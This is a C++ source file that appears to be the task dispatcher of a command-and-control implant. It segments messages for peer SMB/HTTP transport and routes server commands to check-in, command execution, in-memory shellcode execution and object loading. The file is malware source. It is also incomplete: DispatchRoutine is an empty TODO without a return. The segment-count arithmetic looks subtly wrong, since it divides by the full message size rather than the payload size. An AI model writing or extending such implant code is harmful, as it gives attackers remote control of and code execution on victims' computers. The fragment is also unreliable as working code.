#include <core/include/dispatch.hpp>

using namespace Utils;
using namespace Peers;
using namespace Stream;
using namespace Parser;
using namespace Network::Smb;
using namespace Network::Http;
using namespace Memory::Execute;
using namespace Dispatcher;

namespace Dispatcher {
    VOID QueueSegments(UINT8* buffer, UINT32 length) {
        PACKET *qPacket = { };

        UINT32 offset = 0;
        UINT32 peerId = 0;
        UINT32 taskId = 0;
        UINT32 cbSeg  = 0;
        UINT32 seqIndex = 1;

        constexpr auto mMax = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
        const auto seqTotal = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (length > 0) {
            cbSeg = length > mMax ? mMax : length;
            qPacket = (PACKET*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);

            MemCopy(&peerId, buffer, sizeof(peerId));
            MemCopy(&taskId, buffer + 4, sizeof(taskId));

            qPacket->PeerId = peerId;
            qPacket->TaskId = taskId;
            qPacket->MsgType = TypeSegment;

            PackUint32(qPacket, seqIndex);
            PackUint32(qPacket, seqTotal);
            PackUint32(qPacket, cbSeg);
            PackBytes(qPacket, (PBYTE)buffer + offset, cbSeg);

            length -= cbSeg;
            offset += cbSeg;
            seqIndex++;

            AddMessage(qPacket);
        }
    }

    BOOL DispatchRoutine() {
		// TODO:
    }

    VOID CommandDispatch (PACKET* inPack) {
        PARSER parser = { };

        CreateParser(&parser, (PBYTE)inPack->MsgData, inPack->MsgLength);
        UnpackUint32(&parser);

        auto taskId = UnpackUint32(&parser);
        MemCopy(&Ctx->Session.CurrentTaskId, &taskId, sizeof(UINT32));

        switch (UnpackUint32(&parser)) {
		case TypeCheckin:
			MemSet(&Ctx->Session.CheckIn, true, sizeof(BOOL));
			break;
		case TypeTasking:
			ExecuteCommand(parser);
			break;
		case TypeExecute:
			ExecuteShellcode(parser);
			break;
		case TypeObject:
			LoadObject(parser);
			break;

		default:
			break;
        }

        DestroyParser(&parser);
    }
}
